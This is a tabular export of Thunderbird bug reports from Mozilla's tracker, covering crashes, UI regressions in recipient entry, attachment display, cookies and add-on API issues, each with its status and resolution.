1609469,Thunderbird creates permanent cookies,RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: I have a problem with cookies created by Thunderbird 68.4.1 (32-bit) My privacy is compromised, and I cannot control that I am running Only Thunderbird No Firefox No Chrome No Internet Explorer I have set in Thunderbird: Not - Remember websites and links visited Not - Accept cookies from sites Yes - Tell sites that I do not want to be tracked Nevertheless, I get permanent cookies I get cookies even if I do not open any e-mail As soon I open an e-mail, I get more permanent cookies The more emails I open, the more cookies I get Over time, a large collection of permanent cookies is stored My computer ends up open for massive tracking Stopping Thunderbird does not remove that I can see them and remove them only with ccleaner I can delete them with ccleaner only after I have stopped Thunderbird After restarting Thunderbird, after a while, they come back Example: aus5.mozilla.org bing.com support.mozilla.org start.thunderbird.net www.bing.com www.mozilla.org www.facebook.com www.amazon.com www.ebay.com www.paypalobjects.com and many more If I ask in Thunderbird to show cookies, "
1609539,Just installed Thunderbird 68. Now Lightning doesn't work. Properties of my calendar says it cannot find my google calendar.,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0 Steps to reproduce: Not much I can do. It just says it cannot find my google calendar. Actual results: All of the calendars, as well as the holiday calendar are inaccessable and don't show. Expected results: It clearly should have worked. A screen shot is attached."
1609542,UI layout in Print Preview broken in TB 72.0b3,RESOLVED,--,DUPLICATE,"The UI elements layouted very wrong, see screenshot."
1609614,Does not display HTML attachments inline,RESOLVED,--,DUPLICATE,User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: I sent myself a plain-text message with an HTML attachment. I have checked: View/Display Attachments Inline. Actual results: Thunderbird 60.9.1 displayed attachment inline as expected. Thunderbird 68.4.1 did not display attachment inline. Expected results: Thunderbird 68.4.1 should display the attachment inline the way Thunderbird 60.9.1 did.
1609661,(Spam)-Mails with a wrong timezone in the future (+9999) will be displayed as newest mail,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:71.0) Gecko/20100101 Firefox/71.0 Steps to reproduce: I Revieved a Spam-Mail with a Date of Mon, 28 Dec 2099 19:28:42 +9999 in the ""Date""-Section of the Header. I actually recieved the Mail at Sat, 11 Jan 2020 07:25:40 +0100 Actual results: It got permanently sorted as the newest Mail Expected results: Mail should be blocked or sorted differently (maybe?) Maybe validating the timezone would resolve it."
1609684,Icons 'next' + 'previous' do not work properly,RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: I added arrow-buttons to my toolbar to go to next or previous message Actual results: If I use these buttons within the normal window, Cursor ist moving to the next or previous message as desired. But when I open a newsgroup-message by doubleklicking at the message, a new Tab is opened and the next- an previous-button change their function. A click at the button 'next' now jumps to the next thread, instead of leading to the next message within the actual thread. Expected results: Buttons shouldn't change their funktion after opening a message. In TB 60.x.x the buttons' behaviour was as expected. But in TB 68.4.1 there seems to be a buggy functionality of inserted next- and previous-buttons."
1609697,Beta 73 - Source signing task fails due to chain of trust error,RESOLVED,P1,FIXED,Thunderbird beta 73 does not complete the promotion phase because the source-signing task does not produce a chain-of=trust.json.sig file. The beetmover task that follows requires that to upload the source to the FTP archive.
1609745,can not move local folders tab,RESOLVED,--,INVALID,User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Updated software Actual results: After update my Local folders tab was moved to the bottom of the folders instead of being at the top. Expected results: Should not have moved from previous versions from top to bottom.
1609789,"C-C TB crashed when two messages are copied from Inbox folder of one account to another account's Inbox folder. ""Do not call the fragment parser (e.g innerHTML()) in chrome code or ...""",RESOLVED,--,DUPLICATE,"When I try to copy a couple of messages from Input folder of one account to the other's Inbox folder (maildir format), I get the following crash. Do not call the fragment parser (e.g innerHTML()) in chrome code or in about: pages, (uri: ), (caller: chrome://messenger/content/multimessageview.js, line: 246, col: 0), (fragment: <div class=""star""/><div class=""item_summary""><div class=""item_header""/><div class=""snippet""/></div>)Assertion failure: false, at /NEW-SSD/NREF-COMM-CENTRAL/mozilla/dom/security/DOMSecurityMonitor.cpp:103 #01: ???[/NEW-SSD/moz-obj-dir/objdir-tb3/dist/bin/libxul.so +0x5017e90] #02: ???[/NEW-SSD/moz-obj-dir/objdir-tb3/dist/bin/libxul.so +0x2fd253a] #03: ???[/NEW-SSD/moz-obj-dir/objdir-tb3/dist/bin/libxul.so +0x2fd2db6] #04: ???[/NEW-SSD/moz-obj-dir/objdir-tb3/dist/bin/libxul.so +0x31eb768] #05: ???[/NEW-SSD/moz-obj-dir/objdir-tb3/dist/bin/libxul.so +0x31ebd5a] #06: ???[/NEW-SSD/moz-obj-dir/objdir-tb3/dist/bin/libxul.so +0x4025539] #07: ???[/NEW-SSD/moz-obj-dir/objdir-tb3/dist/bin/libxul.so +0x4300440] #08: ???[/NEW-SSD/moz-obj-dir/objdir-tb3/dist/bin/libxul.so +0x7328880] #09: ???[/NEW-SSD/moz-obj-dir/objdir-tb3/dist/bin/libxul.so +0x734dcb8] #10: ???[/NEW-SSD/mo"
1609811,"Move To ""InBox"" Again moves to WRONG InBox",RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36 Steps to reproduce: I have two accounts that I am using Thunderbird for - one is a Verizon Yahoo account and one is a Gmail account. The Verizon Yahoo account is the first one listed when reading from the top down. If I select a message or messages in the Trash folder of the Gmail account and attempt to do a 'Move To ""InBox"" Again,' they get moved to the InBox of the Verizon Yahoo account. Using Thunderbird 72.0b3 (64-bit) for Windows 10. Actual results: Messages got moved to the wrong InBox Expected results: They should have been moved to the right InBox (the one whose Trash folder they are related to."
1609849,Thunderbird crashes when trying to delete attachments from multiple messages (e.g. FiltaQuilla),RESOLVED,--,FIXED,User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 Steps to reproduce: 1) Install FiltaQulla add-on 2) Set up a filter to detach attachments to a file system folder 3) Run this filter on a folder with 2000 or more messages. (I tested with 9995.) 4) Wait for the crash. Actual results: Thunderbird crashes at https://hg.mozilla.org/releases/comm-esr68/file/tip/mailnews/base/src/nsMessenger.cpp#l2547 Expected results: Attachments from all matched messages should have been detached successfully.
1609894,"Typing comma (,) in new recipient display name creates invalid pill prematurely (cannot enter: Surname, First Name <foo@bar.com>)",RESOLVED,P2,FIXED,"STR 1) New message, try to enter new recipient (unknown in AB): Doe, John <foo@bar.com> Actual - entering comma prematurely creates an invalid pill without address validation: (Doe) - impossible to enter display name with comma (even in double quotes) Expected - comma must only auto-create pill after validation (failing that, we'd have to wait for Enter before creating multiple pills in one go). We already have such validation algorithms because if you paste |Doe, John <foo@bar.com>, Jane@bar.com|, that's parsed correctly. - don't create pill prematurely for invalid recipient - allow entering display names with comma - also handle double quotes according to specifications (iirc, almost anything can be display name if in double quotes)"
1609895,Slightly longer recipient address pushes recipients area UI elements out of screen,RESOLVED,--,FIXED,"STR 1) New message, reduce width of TB application window to something like 16cm 2) Type |Dr. Michael Müller-Lüdenscheidt <michael@mueller-luedenscheidt.foo>| (sorry, you really have to type, as this bug does not seem to occur for copy and paste) Actual result - UI elements on the right side of the addressing area (e.g. recipient type buttons, Attach button, subject etc.) are pushed out of screen Expected - don't push UI elements out of screen Interestingly, as you keep trying, it even occurs when the actual text entered is way shorter than the available space in the recipient container. Something wrong here wrt auto-width."
1609901,Space in recipient's originalInput hard to remove with Backspace as it's falsy - polish trimming,RESOLVED,P1,FIXED,"STR 1) type |foo@bar.com, | (one trailing space - regular scenario if you intend to type |foo@bar.com, baz@bar.com|) 2) press backspace to remove the excess leading space Actual - bug 1609894: premature pill creation - space remains at the beginning of new input - backspace focuses pill (foo@bar.com) - hard to remove the space Expected - even after we fix bug 1609894: don't focus pill on backspace if there's spaces in input - investigate our options for trimming/preventing initial spaces, but space is a valid character of local part if quoted, and for other scenarios, we do auto-quote I think"
1609919,"Fails to Keep Folder Summary Files Up To Date - ""Unable to open the summary file""",RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0 Waterfox/56.3 Steps to reproduce: It occurs (mostly) when a message filter attempts to move a message from an inbox to a local folder. However, lately, it also has occurs on the first attempt to display other folders such as inboxes and sent folders. In the first case, the move fails. Actual results: In the above first case, the move fails and I get a message to that effect and the message remains in the inbox. In the second case, if I click on a folder where a Summary File requires creation, I can see the steps the program takes to build it and eventually, the contents of the folder appears. Expected results: I experienced this problem months ago, I reported it and then, just as suddenly as it appeared, it went away. Now, for the lase couple of iterations of T'Bird, it has once again, reared its ugly head!"
1609928,Pills created from an address retrieved via LDAP appear in orange,RESOLVED,P2,FIXED,Pills created from an address retrieved via LDAP appear in orange.
1609931,"Reverts Back to ""Threaded"" and Selects Most Items For Display",RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0 Waterfox/56.3 Steps to reproduce: Despite my requesting ""unthreaded"" and deselecting ""thread"", ""read"", and ""junk status"", T'Bird returns to ""threaded"", and selects ""threaded"", ""read"", and ""junk status"". Actual results: See above. This happens over and over. Expected results: Once selected or deselected, as appropriate, T'Bird should leave these settings alone."
1609958,Cursor not visible upon first edit of recipient pill,RESOLVED,P1,FIXED,"STR 1) New message, type |John Doe <john@asdf.com>| as recipient (sic; must be longer than edit-pill default length), press Enter -> creates new pill. 2) cursor left to select virgin pill, press Enter to edit Actual - cursor not visible (but functional, at the end of label; note that the bug does not occur if your recipient is too short) - starting from 2nd edit, cursor always visible Expected - cursor should be visible also on first edit of a pill Notes My display settings on Windows have 140% screen scaling, which may change font sizes."
1610023,Thunderbird erroneously displays incorrect additional email address in To list.,RESOLVED,P1,FIXED,"I just noticed a problem with the display of messages in Thunderbird 74.0a1 20200117095219 on Fedora 31 x86_64. It appeared I had sent a personal email and accidentally included dev-platform@lists.mozilla.org, fx-team@mozilla.com and qa-leads@mozilla.com in the To: list when I sent it. I was mortified but on closer investigation the message did not appear in the news groups or mailing lists and it was a red-herring. On closer inspection of my emails, I found every email showed these extra email addresses in the To: list even though the view source for the email did not show them. Quitting Thunderbird and restarting resolved the issue. I did see a lot of ""XUL box for mail-messageid element contained an inline #text child, forcing all its children to be wrapped in a block."" messages in the error console. I can't for certain blame it on today's build since it is possible I missed it since I don't normally read mail I've already sent. I don't have steps to reproduce but I'll comment here if I do."
1610154,"Active field is set to ""Reply to"" rather than ""To"" when changing identity",UNCONFIRMED,--,,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 OPR/65.0.3467.78 Steps to reproduce: Assumption: you have multiple identities available in Thunderbird configuration that you can select into the ""From"" drop-down list - Compose a new email using the ""Write"" button - Once the mail composer is open, switch the sender to a different identity than the default one into the ""From"" drop-down list Actual results: After selecting the new identity, the active field becomes ""Reply to"", which is misleading as you expect a ""To"" field to enter the recipient address Expected results: The active field should stay as ""To"" and not ""Reply to"" after selecting a new identity for the sender. This even creates a bigger problem when you reply to an email and switch identity as you can enter a recipient address without noticing that it is actually set into a ""Reply to"" field."
1610175,"mailing list ""XYZ does not match the pattern name@mail.com""",RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Ich habe Maillisten für den Versand angelegt. Sie haben einfache Namen - zum Beispiel: XYZ. Der Versand funktioniert nicht mehr und ich erhalte den Hinweis: ""XYZ entspricht nicht dem Muster name@mail.com"" I have created mailing lists for shipping. They have simple names - for example: XYZ. The shipping no longer works and I receive the message: ""XYZ does not match the pattern name@mail.com"""
1610178,"When I automatically install 68.4.1 from 60.9.1 (64 bit) on MacOS, all the emails that I have opended are lost and all my folders also appear to be lost",RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:71.0) Gecko/20100101 Firefox/71.0 Steps to reproduce: I automatically installed the upgrade that was downloaded. Note, I had a lot of open messages from Inbox before I started the upgrade, and I had not compressed the folder for quite some time (since compressing the folder loses all the message that I have open) Actual results: The install appears to work but does not finish as Thunderbird appears to contain no messages, and all of the Inbox messages that I had open when I started the upgrade have disappeared. Expected results: I would expect to be able to continue working as before with all the Inbox messages I am working on still being open."
1610180,[Attachments] The attachments bar is not scrollable even if there are too many attachments to fit,RESOLVED,P2,FIXED,"When there are many attachments in a received message, so they do not fit into the pane, the list overflows and is not completely visible, but the scrollbar does not appear, so the attachments cannot be accessed. STR: 1. Send or receive a message with many attachments. 1. View the message in the main Thunderbird window. 1. Potentially change the width of the window so the attachments are in a single column and do not fit into the pane. 1. The list of attachments overflows, but there is no scrollbar. --- For the record, this bug was reported to me by another user."
1610247,553 5.7.1 <xxx@gmail.com>: Sender address rejected: not owned by user,RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36 Steps to reproduce: Automatic update performed last week Actual results: Error ""553 5.7.1 <xxx@gmail.com>: Sender address rejected: not owned by user xxx.volny.cz"" got after trying to send an e-mail from my second (gmail) account. SMPT is correctly set and paired with the account, but TB does not seem to notice/take into consideration any changes in configuration."
1610248,Sender of message with RFC 2047 encoded emojis (From: =?UTF-8?B?8J+HsPCfh60g8J+HqPCfh7Lwn4en8J+HriDwn4en8J+Hqw==?= <me@use.net>) not displayed correctly,RESOLVED,--,INVALID,"I received the attached message on a mailing list. It has From: =?UTF-8?B?8J+HsPCfh60g8J+HqPCfh7Lwn4en8J+HriDwn4en8J+Hqw==?= <me@use.net> which Thunderbird displays as From: 🇰🇭 🇨🇲🇧🇮 🇧🇫 Decoding 8J+HsPCfh60g8J+HqPCfh7Lwn4en8J+HriDwn4en8J+Hqw== at https://www.base64decode.org/ gives 🇰🇭 🇨🇲🇧🇮 🇧🇫, and decoding the entire RFC 2047 token at http://www.jorgk.com/decode/ also gives the same. However, my mobile phone app displays four flags (see screenshot) and I was told that Gmail also shows the flags. So who is right? Masatoshi-san, can you please take a look."
1610261,progressbar XUL/node/widget not available,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0 Steps to reproduce: On this page: https://developer.thunderbird.net/add-ons/tb68/changes it’s said that we should stop using the XUL element ""progressmeter"", and we should use “progress”. But it doesn’t work and is considered as a syntax error. Actual results: Syntax error. See attached file. Expected results: No syntax error."
1610305,"Creates second icon due to difference in capitalization used in WM_CLASS and StartupWMClass in ""thunderbird.desktop"" file",REOPENED,--,,"User Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36 Steps to reproduce: Click on Thunderbird icon I created on Plank Actual results: Thunderbird opens with new icon to the far right Expected results: Thunderbird should use the existing icon"
1610312,Excessive time to load a many entry filter for editing.,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Where a filter has a large number of entries (~300), it takes a significant time (~20 seconds), to load the filter into the window for editing. After cancelling and returning to the Messages Filter page, it then takes a significant time (~20 seconds) to mouse click onto an alternative entry. Sometimes the dreaded spinning coloured ball appears. Eventually it appears to resolve itself and it is then possible to select any entries without delay, either with the mouse, or the up-down arrow keys. This problem appeared with one of the latest updates. However, searches show that it had been complained of in the past, in 2011, 2014, and 2017. The filters run normally on a message folder at high speed. It is only when trying to edit a filter that there is a problem. I resolved the problem back to a manageable situation by splitting the 300 items large entry into 20 entries of about 15 items in each. Each then loaded into the editing window in a reasonable time (less than 1 second). To effect this workaround, I edited msgFilterRules.dat as a text file and copied it back. It wou"
1610314,Thunderbird does not handle .ics files properly (but creates new message with .ics file attached),RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Open an .ics file and select Thunderbird as the application to handle it. Actual results: Thunderbird creates a new message with the .ics file attached. Expected results: Thunderbird triggers the code behind Lightnings ""Events and Tasts > Import…"" menu and thus offers me to import the data in the .ics file - by adding it to an existing calendar OR - as a new calendar in lightning."
1610332,Thunderbird is not displaying plain text attachment inline to the email,RESOLVED,--,INVALID,User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: I take a plain text file .txt and can put hello world in the file for example. Then send an email to myself in plain text or html with the txt file being attached. Actual results: I receive the email it shows there is an attachment on it. I can open said email but I will no longer see the contents of the txt inline. I can download the attachment from bottom of email and then view the attachment if desired. Images display inline fine Expected results: The contents of the .txt file should of been in the message body at the bottom. We have .CSV files that we generate and email automatically that are also not displaying anymore on a separate machine. Images display inline fine
1610384,"in personal address book some column, like fullname (in italian Nome visualizzato) is no more available",UNCONFIRMED,--,,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Just updated to 73.0b1. When looking to my Personal Address Book only a few columns are available as headings of the list, the most important missing is Fullname, I'm not sure of the correct english translation. It's the third box in the contact form, where first and second are lastname and family name, Fullname contains both. But when looking to the details the Fullname is visible. Actual results: I've then tried to update last and family name on the detail form, then Thunderbird hangs."
1610406,Crash in [@ PLDHashTable::Search | mozilla::dom::DocumentOrShadowRoot::GetElementById],VERIFIED,--,FIXED,"#2 crash for 73.0b1 Regression in nightly. bp-2736a504-a4fc-4a77-876b-461d80200106 is the earliest buildid 20200105105422 73.0a1 Top 10 frames of crashing thread: 0 xul.dll PLDHashTable::Search xpcom/ds/PLDHashTable.cpp:501 1 xul.dll mozilla::dom::DocumentOrShadowRoot::GetElementById dom/base/DocumentOrShadowRoot.cpp:98 2 xul.dll nsMsgWindow::GetMessageWindowDocShell comm/mailnews/base/src/nsMsgWindow.cpp:76 3 xul.dll nsImapProtocol::SetupWithUrl comm/mailnews/imap/src/nsImapProtocol.cpp:825 4 xul.dll nsImapProtocol::LoadImapUrl comm/mailnews/imap/src/nsImapProtocol.cpp:2099 5 xul.dll nsImapIncomingServer::LoadNextQueuedUrl comm/mailnews/imap/src/nsImapIncomingServer.cpp:521 6 xul.dll nsresult `anonymous namespace'::SyncRunnable2<nsIImapMailFolderSink, const char*, nsIImapUrl*>::Run comm/mailnews/imap/src/nsSyncRunnableHelpers.cpp:121 7 xul.dll nsThread::ProcessNextEvent xpcom/threads/nsThread.cpp:1241 8 xul.dll NS_ProcessNextEvent xpcom/threads/nsThreadUtils.cpp:486 9 xul.dll mozilla::ipc::MessagePump::Run ipc/glue/MessagePump.cpp:87 ```"
1610434,Redundant space at the right end of Tab bar (when Menu bar is enabled),RESOLVED,--,FIXED,"User Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.118 Safari/537.36 Actual results: Redundant space at the right end of Tab bar (when Menu bar is enabled) See the image. v60 is OK. (It's OK when mail.tabs.autoHide=True.)"
1610457,"""Junk"" status of a message is hidden from Add-Ons",RESOLVED,--,FIXED,"User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:56.0) Gecko/20100101 Firefox/56.0 Waterfox/56.3 Steps to reproduce: I wrote an Add-On which searches for messages marked as ""junk"" by using ""browser.messages.list(...)"" to get a list of all messages in a folder and then the ""junk"" tag in the ""page.messages[n].tags[]"" array for a tag named ""junk"". Actual results: In Thunderbird 68.4.1, the ""page.messages[n].tags[]"" array is empty for ALL messages. This has the effect that ALL messages are detected as ""NOT marked as junk"" by the Add-On. Therefore the Add-On does not work correctly. Expected results: In an older Thunderbird 68.x version (I don't remember which version in the range 68.0-68.4.0), the ""page.messages[n].tags[]"" array contained a tag ""junk"" if the message was marked as ""junk"". This allowed the Add-On to detect messages that are marked as ""junk""."
1610460,"Thunderbird immediately segfaults (arch linux, self built) because of an outdated sqlite",RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Updated my OS (Arch linux), then try to start. I've asked other people who has updated and they don't have this issue. So it is definently a me issue. But even if I move .thunderbird to .thunderbird_bak and start it doesn't work. thunderbird --safe-mode segfaults, reinstalling doesn't work, so I'm at a loss... hope you can help, I hate having to open citrix to get a windows environment with outlook 2007.... Actual results: $ thunderbird Segmentation fault (core dumped) Expected results: Thunderbird should open."
1610465,Total account and data loss,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36 Steps to reproduce: Set up 3 mail accounts, 2 from Google and 1 SMTP each time after the first installation and all the subsequent crashes. Actual results: Thunderbird either crashed on its own or the macOS got an update and reopening thunderbird after either event has resulted in total data loss. All the account and their emails are gone and the ~/Library/Thunderbird/Profiles/ folder is completely emptied. Expected results: No data loss should have occured at any of the above mentioned events."
1610580,Mail preview shows garbled characters in preview on *first* click,RESOLVED,--,DUPLICATE,"When I click on a fresh unread mail, going 4into an unread folder, that's usually already relocated to another folder than Inbox, I can see some garbled characters (usually Ã) for diacritics (Umlauts like 'ö' but also some times whitespace characters). This can be fixed by clicking on a different email and then clicking on the mail in question again. I think that the wrong charset / encoding is used initially in that case."
1610661,Opening Attachment does not work if Thunderbird is executed as Remote App on Microsoft Remotedesktopserver,RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Thunderbird is started from another Remote-App on Microsoft Remote Desktop Server (Windows Server 2016). All was working fine till update to 68.4.1. Opening an Attachment (as an example an xlsx-File from Excel) now cannot start directly the assigned application anymore (for example LibreOffice Calc). Actual results: Opening an xlsx-Attachment first starts dialog, what to do with it, suggests opening wirh LibreOffice Calc (as expected so far), but when I confirm the start another Dialog starts ""Dieser Link muss mit einer Anwendung gestartet werden"" (This link has to be opened with an application) and shows sent to file as only option first, alternatively I can open a search dialog from a button. The search I does not offer applications but I can navigate through file system to scalc.exe and start with it. Then there is an option to save this setting for all file-links, but I didn't check it. I fear this setting then saved for all attachments no matter what type this actually would be. The users working on the system reported, that nothing happened after confirming the ""Star"
1610673,Thunderbird stopped to receive emails after the last update,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Thunderbird/73.0 release 73.0b1 build 20200116202525 I am using Thunderbird for years, currently using 73.0b1, which was updated automatically yesterday evening. Since this update I stopped to receive emails. I am able to send emails from one my email address to another, and I am receiving them, but in other email client, not in Thunderbird. Not, it is not caused by deleting email after it is received by other client, I have set it properly to keep messages on the server. I have made no change in my settings, only what changed was just yesterday's automatical update - before it worked properly (for long years), after it it stopped to recieve emails. Actual results: Thunderbird is able to send new emails, but it is unable to receive them after the yesterday's update. However sent emails are received properly by other email clients. Expected results: Thunderbird should recieve emails as it was doing properly for yeras before the last update."
1610742,"'Remove Duplicates"" addon suddenly stopped working.",RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36 Steps to reproduce: I am using thunderbird 73.0b1 (32-bit). With it I was using the addon 'Remove duplicates' for several months. Suddenly a couple days ago the addon stopped working. I tried removing and adding it again several times, even reinstalled mozilla thunderbird after removing the addons. But it is not working. Actual results: The addon gets installed. But in Tools - Addon Options, the options window does not open or opens partially and the options cannot be seen and selected. Expected results: Earlier a full window used to open showing all the options available for selection. After making the option selections the addon used to work very well."
1610746,Insert Charachters and Symbols,RESOLVED,--,FIXED,User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0 Steps to reproduce: Tried to insert symbol in new e-mail from the insert tab Actual results: Window with XML parsing error appeared Expected results: List of symbols to be selected
1610765,Cannot open already attached attachment in mail composer,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.4 Safari/605.1.15 Steps to reproduce: create new email attach a file to be sent with email (.pdf or .jpeg) try to open it Actual results: no way to open it to check if file is the one I want to send Expected results: should open, used to do that 3 or 4 months ago"
1610771,Subject line is now white and the letters are white,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36 Steps to reproduce: Entered text into the subject line. Actual results: The background is white and the letters are white. Expected results: The text should be colored black. Only way you can now see the subject line is if you place the cursor over the text. Why did you guys touch this at all?"
1610773,Some Tag colors not displayed in message list after upgrade from 60 to 68.4.1,RESOLVED,--,WORKSFORME,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36 Steps to reproduce: Upgraded Thunderbird from 60 to 68.4.1 with existing tags applied to messages Actual results: Some tagged messages display in the message list pane using the system default colors, whereas others display using their tag color. This seems tag specific (i.e. all messages with a given tag display in the same way - either with color or without). The tag is correctly displayed (with the correct color) in the message preview pane and in the message reader. Removing and re-applying the tag does not fix the problem. Expected results: Tagged messages should display in the message list pane with their text in the tag color (or their background when selected). This is was the behaviour of all tags prior to the upgrade, and is the behaviour of some tags now."
1610795,App Not Responding when deleting e-mails after updating to 68.3.2 - not honoring Windows integrated search setting,RESOLVED,--,WORKSFORME,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36 Steps to reproduce: After Thunderbird automatically updated to 68.3.1 I would continually get ""Not Responding"" after deleting e-mails. These are IMAP accounts but not sure if that matters. After some Internet searches I uncovered a person with the same issue and he said after he turned off ""Allow Windows Search to search messages"" it fixed his problem. That also fixed my problem but one thing I should note is that my checkbox was already unchecked so it wasn't honoring that setting after updating to 68.3.1. What I did was check the box, close Options and closed Thunderbird. Then I opened Thunderbird and went to Options and unchecked that setting. Then I restarted Thunderbird and all was working great again. Actual results: Even though the checkbox for ""Allow Windows Search to search messages"" was unchecked, Thunderbird was not honoring this setting. Expected results: Windows Search should have not been allowed to search my messages."
1610797,Crash in [@ nsLDAPSSLClose],RESOLVED,--,FIXED,crash is new with 68.3.0. Variety of crash addresses bp-41813288-f64c-4e5d-9b6b-ca7a50191205 68.3.0 0x0 bp-8b31771c-b470-4865-b0ce-073500200122 68.4.1 0xffffffffffffffff bp-0f3ae5b5-522c-48d8-8d01-589c00200122. 68.4.1 0xff1471ff ``` Top 10 frames of crashing thread: 0 xul.dll nsLDAPSSLClose comm/ldap/xpcom/src/nsLDAPSecurityGlue.cpp:70 1 ldap60.dll nsldapi_close_connection comm/ldap/c-sdk/libraries/libldap/os-ip.c:737 2 ldap60.dll nsldapi_free_connection comm/ldap/c-sdk/libraries/libldap/request.c:761 3 ldap60.dll nsldapi_free_request comm/ldap/c-sdk/libraries/libldap/request.c:953 4 ldap60.dll nsldapi_free_request comm/ldap/c-sdk/libraries/libldap/request.c:949 5 ldap60.dll nsldapi_result_nolock comm/ldap/c-sdk/libraries/libldap/result.c:134 6 ldap60.dll ldap_result comm/ldap/c-sdk/libraries/libldap/result.c:104 7 xul.dll nsLDAPConnectionRunnable::Run comm/ldap/xpcom/src/nsLDAPConnection.cpp:626 8 xul.dll nsThread::ProcessNextEvent xpcom/threads/nsThread.cpp:1175 9 xul.dll NS_ProcessNextEvent xpcom/threads/nsThreadUtils.cpp:486 ```
1610798,Thunderbird ignores second command line argument for attachments,RESOLVED,--,WORKSFORME,"User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 Steps to reproduce: Enter a command line like this in a Linux terminal: thunderbird -compose to=""info@gmail.com"" ,subject=""SubjectText"" ,body=""bodytext"" ,attachment='/tmp/File.txt,/tmp/File2.txt' Actual results: Thunderbird opens but attaches only the first file. Expected results: Thunderbird should attach both files. This feature es mentioned here: https://stackoverflow.com/questions/27836576/adding-several-attachments-to-thunderbird-from-command-line"
